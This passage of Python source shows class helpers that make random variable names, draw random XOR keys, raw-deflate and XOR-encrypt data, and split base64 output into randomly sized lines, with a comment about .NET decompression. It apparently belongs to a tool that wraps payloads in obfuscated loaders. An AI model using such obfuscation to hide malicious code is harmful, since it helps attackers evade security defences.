    @staticmethod
    def _rand_var(prefix: str = "v") -> str:
        length = random.randint(6, 12)
        chars = string.ascii_letters + string.digits
        return f"{prefix}{''.join(random.choices(chars, k=length))}"

    def _xor_key(self) -> bytes:
        return secrets.token_bytes(random.randint(1, 64))

    def _compress(self, data: bytes) -> bytes:
        # Use wbits=-15 to generate a raw deflate stream (RFC 1951) without the zlib headers/footers.
        # This completely resolves the 'Block length does not match with its complement' .NET exception.
        compressor = zlib.compressobj(level=9, method=zlib.DEFLATED, wbits=-15)
        return compressor.compress(data) + compressor.flush()

    def _encrypt(self, data: bytes, key: bytes) -> bytes:
        key_len = len(key)
        return bytes(b ^ key[i % key_len] for i, b in enumerate(data))

    def _base64_encode(self, data: bytes) -> str:
        enc = base64.b64encode(data).decode("utf-8")
        chunk = random.randint(80, 200)
        return "\n".join(enc[i:i+chunk] for i in range(0, len(enc), chunk))

